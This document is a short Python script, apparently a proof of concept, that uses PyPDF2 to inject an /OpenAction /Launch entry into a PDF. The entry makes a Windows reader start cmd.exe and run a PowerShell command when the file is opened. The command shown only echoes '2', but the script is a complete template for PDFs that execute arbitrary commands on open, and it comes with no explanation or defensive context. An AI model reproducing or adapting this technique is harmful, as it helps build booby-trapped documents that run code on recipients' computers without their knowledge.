import PyPDF2
from PyPDF2.generic import DictionaryObject, NameObject, TextStringObject

pdf_path = "output.pdf"
output_path = "modified.pdf"

reader = PyPDF2.PdfReader(open(pdf_path, "rb"))
writer = PyPDF2.PdfWriter()

for i in range(len(reader.pages)):
    writer.add_page(reader.pages[i])

win_dict = DictionaryObject()
win_dict.update({
    NameObject("/F"): TextStringObject("cmd.exe"),
    NameObject("/P"): TextStringObject('/c powershell -Command "echo 2"')
})

launch_action = DictionaryObject()
launch_action.update({
    NameObject("/S"): NameObject("/Launch"),
    NameObject("/Win"): win_dict
})

writer._root_object.update({
    NameObject("/OpenAction"): launch_action
})

with open(output_path, "wb") as output_pdf:
    writer.write(output_pdf)

print(f"PDF modified and saved as '{output_path}'")
